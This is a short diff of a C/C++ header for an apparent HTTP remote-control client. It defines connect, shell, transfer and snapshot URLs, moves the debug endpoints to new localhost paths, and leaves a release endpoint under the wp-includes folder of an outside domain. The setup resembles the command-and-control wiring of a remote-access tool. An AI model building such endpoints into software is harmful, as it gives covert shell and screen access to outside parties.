@@ -3,10 +3,10 @@
 #endif // _MSC_VER > 1000
 
 #ifdef _DEBUG
-#define DestUrl L"http://127.0.0.1/web/connect.php"
-#define ShellUrl L"http://127.0.0.1/web/cmd.php"
-#define TranUrl L"http://127.0.0.1/web/cmd.php"
-#define SnapUrl L"http://127.0.0.1/web/cmd.php"
+#define DestUrl L"http://127.0.0.1/httpRemoteControl/client/connect.php"
+#define ShellUrl L"http://127.0.0.1/httpRemoteControl/client/cmd.php"
+#define TranUrl L"http://127.0.0.1/httpRemoteControl/client/cmd.php"
+#define SnapUrl L"http://127.0.0.1/httpRemoteControl/client/cmd.php"
 
 #else
 #define DestUrl L"http://www.whitepig.org/wp-includes/connect.php"
